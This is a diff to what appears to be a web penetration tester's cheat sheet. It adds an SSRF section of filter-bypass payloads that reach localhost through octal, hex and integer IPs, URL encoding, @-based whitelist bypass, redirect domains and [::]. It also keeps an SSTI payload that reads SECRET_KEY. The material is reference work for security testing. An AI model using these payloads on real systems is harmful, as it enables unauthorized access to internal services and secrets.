@@ -990,10 +990,53 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 `{{settings.SECRET_KEY}}`
   
 ### Doc for SSTI	
-
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
   
-## SSRF - Protocol Smuggling
+## Server Side Request Forgery - SSRF
+
+### Bypass in Filters
+-> Host obfuscation (hex, octa, integer)  
+e.g.
+`http://0177.0.0.1`
+`http://0x7F.0.0.1`
+`http://2130706433`
+
+-> rare address  
+e.g.  
+```
+http://0/  
+http://127.1
+http://127.1.1  
+http://127.127.127.127  
+http://127.2.2.2  
+http://127.2.0.2
+```  
+
+-> URL encoding  
+e.g.  
+`http://%31%32%37%2e%30%2e%30%2e%31`
+
+-> using bash variables  
+e.g.  
+`http://evil.$site.com`
+
+-> Bypass of whitelist  
+e.g.  
+`http:/site.com@127.0.0.1`
+
+-> domain redirection  
+e.g.  
+`http://localtest.me`
+
+-> using [::]  
+e.g.  
+`http://[::]`
+
+-> Wordlist bypass localhost  
+
+### Bypass localhost wordlist
+
+### Protocol Smuggling
 
 -> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.
 
